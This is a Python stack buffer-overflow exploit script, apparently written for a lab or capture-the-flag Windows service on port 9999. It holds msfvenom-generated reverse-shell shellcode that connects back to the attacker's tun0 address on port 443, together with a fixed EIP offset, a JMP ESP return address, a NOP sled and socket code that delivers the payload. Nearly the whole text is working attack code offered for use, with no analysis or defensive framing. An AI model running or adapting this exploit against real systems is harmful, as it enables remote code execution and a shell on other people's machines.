#!/usr/bin/python3
import socket
import struct

def p32(data):
    return struct.pack("<I", data)

host, port = "10.10.217.248", 9999
# msfvenom -p windows/shell_reverse_tcp -a x86 LHOST=tun0 LPORT=443 EXITFUNC=thread -b "\x00" -f py -v shellcode

shellcode =  b""
shellcode += b"\xd9\xce\xba\x54\xf4\xb0\x90\xd9\x74\x24\xf4"
shellcode += b"\x5f\x2b\xc9\xb1\x52\x31\x57\x17\x83\xef\xfc"
shellcode += b"\x03\x03\xe7\x52\x65\x57\xef\x11\x86\xa7\xf0"
shellcode += b"\x75\x0e\x42\xc1\xb5\x74\x07\x72\x06\xfe\x45"
shellcode += b"\x7f\xed\x52\x7d\xf4\x83\x7a\x72\xbd\x2e\x5d"
shellcode += b"\xbd\x3e\x02\x9d\xdc\xbc\x59\xf2\x3e\xfc\x91"
shellcode += b"\x07\x3f\x39\xcf\xea\x6d\x92\x9b\x59\x81\x97"
shellcode += b"\xd6\x61\x2a\xeb\xf7\xe1\xcf\xbc\xf6\xc0\x5e"
shellcode += b"\xb6\xa0\xc2\x61\x1b\xd9\x4a\x79\x78\xe4\x05"
shellcode += b"\xf2\x4a\x92\x97\xd2\x82\x5b\x3b\x1b\x2b\xae"
shellcode += b"\x45\x5c\x8c\x51\x30\x94\xee\xec\x43\x63\x8c"
shellcode += b"\x2a\xc1\x77\x36\xb8\x71\x53\xc6\x6d\xe7\x10"
shellcode += b"\xc4\xda\x63\x7e\xc9\xdd\xa0\xf5\xf5\x56\x47"
shellcode += b"\xd9\x7f\x2c\x6c\xfd\x24\xf6\x0d\xa4\x80\x59"
shellcode += b"\x31\xb6\x6a\x05\x97\xbd\x87\x52\xaa\x9c\xcf"
shellcode += b"\x97\x87\x1e\x10\xb0\x90\x6d\x22\x1f\x0b\xf9"
shellcode += b"\x0e\xe8\x95\xfe\x71\xc3\x62\x90\x8f\xec\x92"
shellcode += b"\xb9\x4b\xb8\xc2\xd1\x7a\xc1\x88\x21\x82\x14"
shellcode += b"\x1e\x71\x2c\xc7\xdf\x21\x8c\xb7\xb7\x2b\x03"
shellcode += b"\xe7\xa8\x54\xc9\x80\x43\xaf\x9a\xa4\x98\xac"
shellcode += b"\x9b\xd1\x9c\xb2\x1a\x99\x28\x54\x76\xcd\x7c"
shellcode += b"\xcf\xef\x74\x25\x9b\x8e\x79\xf3\xe6\x91\xf2"
shellcode += b"\xf0\x17\x5f\xf3\x7d\x0b\x08\xf3\xcb\x71\x9f"
shellcode += b"\x0c\xe6\x1d\x43\x9e\x6d\xdd\x0a\x83\x39\x8a"
shellcode += b"\x5b\x75\x30\x5e\x76\x2c\xea\x7c\x8b\xa8\xd5"
shellcode += b"\xc4\x50\x09\xdb\xc5\x15\x35\xff\xd5\xe3\xb6"
shellcode += b"\xbb\x81\xbb\xe0\x15\x7f\x7a\x5b\xd4\x29\xd4"
shellcode += b"\x30\xbe\xbd\xa1\x7a\x01\xbb\xad\x56\xf7\x23"
shellcode += b"\x1f\x0f\x4e\x5c\x90\xc7\x46\x25\xcc\x77\xa8"
shellcode += b"\xfc\x54\x97\x4b\xd4\xa0\x30\xd2\xbd\x08\x5d"
shellcode += b"\xe5\x68\x4e\x58\x66\x98\x2f\x9f\x76\xe9\x2a"
shellcode += b"\xdb\x30\x02\x47\x74\xd5\x24\xf4\x75\xfc"


cmd = b"Username\r\n"
pattern_length = 6400 # Documentation and keep for length retention
offset = 2012
new_eip = b"BBBB"
jmp_esp = p32(0x625014df) # must be the correct endianness
nop_sled = b"\x90" * 40  # multiple of 4

payload = b"".join([
            b"A" * offset,
            jmp_esp,            
            nop_sled,
            shellcode,
            b"C" * (pattern_length - len(new_eip) - offset - len(nop_sled) - len(shellcode)),
            b"\r\n",
        ])

with socket.socket() as s: 
    s.connect((host,port))
    s.recv(1024)
    s.send(cmd)
    s.recv(1024)
    s.send(payload)

